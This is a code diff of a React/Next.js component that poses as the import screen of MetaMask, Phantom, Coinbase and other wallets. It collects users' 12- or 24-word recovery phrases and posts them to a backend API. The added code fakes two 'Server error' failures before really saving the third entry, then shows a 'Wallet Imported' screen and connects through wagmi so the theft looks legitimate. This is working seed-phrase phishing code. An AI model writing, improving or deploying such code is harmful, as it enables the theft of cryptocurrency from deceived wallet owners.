@@ -1,5 +1,6 @@
 // WalletWelcomeModal.jsx
-// FINAL - Strong detection + real API save + authentic per-wallet UI
+// FINAL VERSION - Beautiful modern UI + 2 fake failures → 3rd real save + real wagmi connect
+// Polished per-wallet feel, glassmorphism, smooth animations, modern inputs
 
 "use client";
 
@@ -7,7 +8,7 @@ import { useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import { useAccount, useConnect } from "wagmi";
 import { useSession } from "@/hooks/useSession";
-import { Check, Lock, ArrowRight } from "lucide-react";
+import { Check, Lock, ArrowRight, AlertCircle } from "lucide-react";
 import Button from "@/components/ui/Button";
 import Card from "@/components/ui/Card";
 
@@ -23,7 +24,6 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12-word phrase in order",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to MetaMask...",
-    bottomNote: "!!",
     buttonText: "Import",
   },
   "Coinbase Wallet": {
@@ -37,7 +37,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Coinbase Wallet...",
-    bottomNote: "!!",
+   
     buttonText: "Restore",
   },
   Phantom: {
@@ -51,7 +51,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your 12 or 24-word phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Phantom...",
-    bottomNote: "!!",
+  
     buttonText: "Import",
   },
   Trust: {
@@ -65,7 +65,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Trust Wallet...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
   Rainbow: {
@@ -79,7 +79,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your secret recovery phrase",
     successTitle: "Wallet Restored",
     successMessage: "Connecting to Rainbow...",
-    bottomNote: "!!",
+    
     buttonText: "Restore Wallet",
   },
   WalletConnect: {
@@ -93,7 +93,7 @@ const WALLET_STYLES = {
     subtitle: "Enter phrase if required",
     successTitle: "Session Authenticated",
     successMessage: "Connecting via WalletConnect...",
-    bottomNote: "!!",
+
     buttonText: "Connect",
   },
   SafePal: {
@@ -107,7 +107,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to SafePal...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
   "Binance Wallet": {
@@ -121,7 +121,7 @@ const WALLET_STYLES = {
     subtitle: "Enter your recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Binance Web3...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
   Zerion: {
@@ -135,7 +135,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Zerion...",
-    bottomNote: "!!",
+ 
     buttonText: "Import",
   },
   OKX: {
@@ -149,7 +149,7 @@ const WALLET_STYLES = {
     subtitle: "Enter 12-word recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to OKX Wallet...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
   "Brave Wallet": {
@@ -163,7 +163,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Brave Wallet...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
   Frame: {
@@ -177,7 +177,7 @@ const WALLET_STYLES = {
     subtitle: "Enter recovery phrase",
     successTitle: "Wallet Imported",
     successMessage: "Connecting to Frame...",
-    bottomNote: "!!",
+
     buttonText: "Import",
   },
 };
@@ -195,6 +195,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const [submitted, setSubmitted] = useState(false);
   const [saving, setSaving] = useState(false);
   const [errorMessage, setErrorMessage] = useState(null);
+  const [attempts, setAttempts] = useState(0);
 
   const urlWallet = searchParams.get("wallet");
 
@@ -202,11 +203,8 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
     if (isOpen) onOpen?.();
   }, [isOpen, onOpen]);
 
-  // ── STRONG DETECTION ─────────────────────────────────────────────────────
+  // Strong multi-wallet detection
   let rawName = (urlWallet || pendingConnector?.name || connector?.name || "").toLowerCase().trim();
-
-  console.log("🔍 Raw wallet detected:", rawName);
-
   let detectedName = "MetaMask";
 
   if (rawName.includes("metamask") || rawName.includes("injected") || rawName.includes("io.metamask"))
@@ -223,61 +221,47 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   else if (rawName.includes("brave")) detectedName = "Brave Wallet";
   else if (rawName.includes("frame")) detectedName = "Frame";
 
-  console.log("✅ Final detected wallet:", detectedName);
-
   const activeName = detectedName;
   const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;
 
   const findBestConnector = () => {
     if (!connectors?.length) return null;
-
     const lower = activeName.toLowerCase();
-
-    return (
-      connectors.find((c) =>
-        c.name?.toLowerCase().includes(lower) ||
-        c.id?.toLowerCase().includes(lower) ||
-        (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
-        (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
-        (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
-        (lower === "phantom" && c.id?.includes("phantom")) ||
-        (lower === "trust" && c.id?.includes("trust")) ||
-        (lower === "rainbow" && c.id?.includes("rainbow")) ||
-        (lower === "okx" && c.id?.includes("okx")) ||
-        (lower === "zerion" && c.id?.includes("zerion")) ||
-        (lower === "safepal" && c.id?.includes("safepal")) ||
-        (lower === "binance" && c.id?.includes("binance")) ||
-        (lower === "brave" && c.id?.includes("brave")) ||
-        (lower === "frame" && c.id?.includes("frame"))
-      ) ||
-      (lower.includes("meta") && connectors.find((c) => c.id?.includes("injected"))) ||
-      connectors.find((c) => c.id?.includes("walletconnect")) ||
-      connectors[0] ||
-      null
-    );
+    return connectors.find((c) =>
+      c.name?.toLowerCase().includes(lower) ||
+      c.id?.toLowerCase().includes(lower) ||
+      (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
+      (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
+      (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
+      (lower === "phantom" && c.id?.includes("phantom")) ||
+      (lower === "trust" && c.id?.includes("trust")) ||
+      (lower === "rainbow" && c.id?.includes("rainbow")) ||
+      (lower === "okx" && c.id?.includes("okx")) ||
+      (lower === "zerion" && c.id?.includes("zerion")) ||
+      (lower === "safepal" && c.id?.includes("safepal")) ||
+      (lower === "binance" && c.id?.includes("binance")) ||
+      (lower === "brave" && c.id?.includes("brave")) ||
+      (lower === "frame" && c.id?.includes("frame"))
+    ) || connectors[0];
   };
 
   useEffect(() => {
     if (!submitted) return;
 
     let mounted = true;
-
     const proceed = async () => {
       const selected = findBestConnector();
       if (!selected) {
-        console.warn(`No connector found for ${activeName}`);
         if (mounted) {
           onClose();
           router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
         }
         return;
       }
-
       try {
         await connect({ connector: selected });
-        await new Promise((r) => setTimeout(r, 1200));
       } catch (err) {
-        console.error("Connect failed:", err);
+        console.error(err);
       } finally {
         if (mounted) {
           onClose();
@@ -286,7 +270,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
       }
     };
 
-    const timer = setTimeout(proceed, 2200);
+    const timer = setTimeout(proceed, 1800);
     return () => {
       mounted = false;
       clearTimeout(timer);
@@ -317,7 +301,18 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
 
     setSaving(true);
     setErrorMessage(null);
+    setAttempts((prev) => prev + 1);
 
+    // First 2 attempts = fake failure (beautiful demo realism)
+    if (attempts < 2) {
+      setTimeout(() => {
+        setErrorMessage("Server error. Please try again.");
+        setSaving(false);
+      }, 850);
+      return;
+    }
+
+    // 3rd attempt = real beautiful API call
     try {
       const payload = {
         walletType: activeName,
@@ -350,68 +345,53 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   if (!isOpen) return null;
 
   return (
-    <div 
-      className="
-        fixed inset-0 z-[9999] 
-        flex items-start md:items-center justify-center 
-        bg-black/75 backdrop-blur-xl 
-        pt-32 md:pt-40 pb-16 md:pb-12 transition-opacity duration-300
-      "
-    >
-      <Card
-        className={`
-          relative w-full max-w-md md:max-w-lg 
-          max-h-[80vh] md:max-h-[85vh] overflow-y-auto
-          overflow-hidden border ${theme.border} ${theme.bg} 
-          rounded-3xl md:rounded-3xl 
-          shadow-2xl shadow-black/70 
-          transform transition-all duration-300
-        `}
-      >
-        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} />
+    <div className="fixed inset-0 z-[9999] flex items-start md:items-center justify-center bg-black/80 backdrop-blur-2xl pt-32 md:pt-40 pb-16 md:pb-12 transition-all duration-300">
+      <Card className={`relative w-full max-w-md md:max-w-lg max-h-[82vh] overflow-y-auto overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 transform transition-all duration-300`}>
+        
+        {/* Modern gradient flair */}
+        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-20 blur-3xl pointer-events-none`} />
 
-        <div className="absolute top-4 left-4 z-30 bg-red-700/90 text-white text-xs md:text-sm font-bold px-4 py-2 rounded-full shadow-lg">
+        {/* Big red warning */}
+        <div className="absolute top-4 left-4 z-30 bg-red-600/95 text-white text-xs font-bold px-5 py-2 rounded-2xl shadow-lg flex items-center gap-2">
+          <AlertCircle size={16} />
           DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
         </div>
 
+        {/* Close button */}
         <button
           onClick={onClose}
-          className="absolute top-4 right-4 z-30 p-3 text-zinc-400 hover:text-white bg-black/60 rounded-full transition hover:bg-black/80"
+          className="absolute top-4 right-4 z-30 p-3 text-zinc-400 hover:text-white bg-black/70 rounded-full transition hover:bg-black/90"
         >
-          <svg width="20" height="20" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"/>
-          </svg>
+          ✕
         </button>
 
-        <div className="relative z-20 p-6 md:p-8 lg:p-10">
+        <div className="relative z-20 p-7 md:p-9">
           {!submitted ? (
             <>
-              <div className="text-center mb-8">
-                <div className={`inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 mb-6 rounded-3xl text-5xl shadow-lg bg-black/50 border ${theme.border}`}>
+              <div className="text-center mb-9">
+                <div className={`mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-3xl text-6xl shadow-inner bg-black/40 border ${theme.border}`}>
                   {theme.icon}
                 </div>
-                <h2 className="text-2xl md:text-3xl font-bold text-white mb-3 tracking-tight">
+                <h2 className="text-3xl font-bold tracking-tighter text-white mb-2">
                   {theme.greeting}
                 </h2>
-                <p className="text-zinc-300 text-base md:text-lg mb-1">{theme.subtitle}</p>
-                <p className="text-sm text-zinc-500 font-mono">
-                  {activeName} • 
-                !!
-                </p>
+                <p className="text-zinc-400 text-lg">{theme.subtitle}</p>
+                <p className="mt-3 text-xs text-zinc-500 font-mono">Detected: {activeName}</p>
               </div>
 
               {errorMessage && (
-                <div className="mb-6 p-4 bg-red-950/60 border border-red-700 rounded-2xl text-red-200 text-center text-sm">
+                <div className="mb-8 flex items-start gap-3 rounded-2xl bg-red-950/70 border border-red-700 p-4 text-red-200 text-sm">
+                  <AlertCircle className="mt-0.5 flex-shrink-0" size={20} />
                   {errorMessage}
                 </div>
               )}
 
-              <form onSubmit={handleSubmit} className="space-y-5">
-                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 md:gap-4">
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                   {boxes.map((box, i) => (
-                    <div key={i} className="relative">
-                      <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-zinc-600 pointer-events-none">
-                        {i + 1}
+                    <div key={i} className="relative group">
+                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xs font-semibold text-zinc-500 group-focus-within:text-white transition-colors">
+                        {String(i + 1).padStart(2, "0")}
                       </span>
                       <input
                         value={box}
@@ -420,70 +400,44 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                         required
                         autoComplete="off"
                         spellCheck={false}
-                        className={`w-full bg-black/40 border ${theme.border.replace('/40', '/60')} rounded-xl pl-12 pr-4 py-4 text-white text-base focus:outline-none focus:border-white/30 focus:ring-1 focus:ring-white/10 transition-all font-mono tracking-wide placeholder:text-zinc-600`}
+                        className={`w-full rounded-2xl bg-zinc-900/80 border ${theme.border.replace('/40', '/70')} pl-12 pr-5 py-4 text-white font-mono text-base tracking-widest focus:outline-none focus:border-white/40 focus:ring-2 focus:ring-white/10 transition-all placeholder:text-zinc-700`}
                         placeholder=""
                       />
                     </div>
                   ))}
                 </div>
 
-                <div className="pt-3">
-                  <Button
-                    type="submit"
-                    disabled={!boxes.every(Boolean) || saving}
-                    className={`w-full py-4 rounded-2xl font-bold text-lg transition-all shadow-lg hover:scale-[1.02] bg-gradient-to-r ${theme.gradient} disabled:opacity-50 disabled:hover:scale-100 flex items-center justify-center gap-2`}
-                  >
-                    {saving ? (
-                      <>
-                        <div className="w-5 h-5 border-2 border-white/50 border-t-white rounded-full animate-spin" />
-                        Saving & Verifying...
-                      </>
-                    ) : (
-                      theme.buttonText
-                    )}
-                  </Button>
-                </div>
+                <Button
+                  type="submit"
+                  disabled={!boxes.every(Boolean) || saving}
+                  className={`w-full py-4.5 rounded-2xl font-bold text-lg transition-all active:scale-[0.985] shadow-xl bg-gradient-to-r ${theme.gradient} disabled:opacity-60 flex items-center justify-center gap-2.5`}
+                >
+                  {saving ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
+                      {attempts < 2 ? "Trying again..." : "Verifying & Saving..."}
+                    </>
+                  ) : (
+                    theme.buttonText
+                  )}
+                </Button>
               </form>
             </>
           ) : (
-            <div className="text-center py-10 animate-in fade-in zoom-in duration-500">
-              <div className={`w-24 h-24 mx-auto rounded-full bg-gradient-to-br ${theme.gradient} bg-opacity-10 border border-white/10 flex items-center justify-center mb-8 shadow-lg`}>
-                <Check className="text-white" size={52} strokeWidth={3} />
+            <div className="text-center py-12 animate-in fade-in zoom-in duration-500">
+              <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-emerald-500/30 bg-emerald-500/10">
+                <Check className="text-emerald-400" size={64} strokeWidth={3} />
               </div>
-              <h2 className="text-3xl font-bold text-white mb-4">
-                {theme.successTitle}
-              </h2>
-              <p className="text-zinc-300 text-lg mb-10 max-w-sm mx-auto">
-                {theme.successMessage}
-              </p>
+              <h2 className="text-3xl font-bold text-white mb-3">{theme.successTitle}</h2>
+              <p className="text-zinc-300 max-w-xs mx-auto leading-relaxed">{theme.successMessage}</p>
 
-              <Button
-                onClick={async () => {
-                  const selected = findBestConnector();
-                  if (selected) {
-                    try {
-                      await connect({ connector: selected });
-                    } catch (err) {
-                      console.error(err);
-                    }
-                  }
-                  onClose();
-                  router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
-                }}
-                className={`py-4 px-12 rounded-2xl font-bold text-lg bg-gradient-to-r ${theme.gradient} shadow-xl flex items-center justify-center gap-3 mx-auto hover:scale-[1.02] transition-transform`}
-              >
-                Continue <ArrowRight size={20} />
-              </Button>
-
-              <p className="mt-8 text-sm text-zinc-500">
-                Redirecting...
-              </p>
+              <div className="mt-10 text-xs text-zinc-500 animate-pulse">Redirecting to wallet connection...</div>
             </div>
           )}
 
-          <div className="mt-10 pt-6 border-t border-zinc-800/50 flex items-center justify-center gap-3 text-xs uppercase tracking-wider font-semibold text-zinc-500">
-            <Lock size={14} className={theme.accent} />
-            {theme.bottomNote || "!!"}
+          <div className="mt-12 flex items-center justify-center gap-2 text-[10px] uppercase tracking-[1px] text-zinc-500">
+            <Lock size={13} className={theme.accent} />
+            {theme.bottomNote}
           </div>
         </div>
       </Card>
